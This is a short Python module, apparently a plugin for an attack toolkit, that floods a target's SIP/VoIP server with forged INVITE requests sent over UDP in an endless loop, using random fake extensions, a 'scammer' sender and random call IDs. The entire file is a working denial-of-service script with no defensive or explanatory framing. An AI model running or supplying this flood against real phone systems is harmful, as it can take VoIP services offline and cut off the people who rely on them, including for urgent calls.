import random
import socket

REQUIRED_OPTIONS = {
        "IP": "",
        "PORT": "standar port 5060"
}

def execute(options):

    ip = options.get("IP")
    port = options.get("PORT")

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    print(f"[*] Starting Invite Flood on {ip}...")

    while True:
        fake_ext = random.randint(100, 9999)
        payload = (
            f"INVITE sip:{fake_ext}@{ip} SIP/2.0\r\n"
            f"From: <sip:scammer@{ip}>;tag={random.randint(100,999)}\r\n"
            f"To: <sip:{fake_ext}@{ip}>\r\n"
            "Call-ID: " + str(random.getrandbits(32)) + "\r\n"
            "CSeq: 1 INVITE\r\n\r\n"
        )
        sock.sendto(payload.encode(), (ip, port))
